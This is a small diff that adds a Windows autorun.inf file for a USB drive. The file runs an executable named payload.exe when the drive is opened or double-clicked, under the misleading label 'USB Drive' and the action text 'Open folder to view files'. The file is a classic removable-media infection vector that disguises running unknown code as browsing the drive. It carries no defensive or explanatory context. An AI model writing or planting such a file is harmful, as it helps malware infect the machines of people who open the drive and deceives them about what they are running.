@@ -1,0 +1,7 @@
+[autorun]
+open=payload.exe
+icon=payload.exe,0
+label=USB Drive
+action=Open folder to view files
+shell\open=Open
+shell\open\command=payload.exe
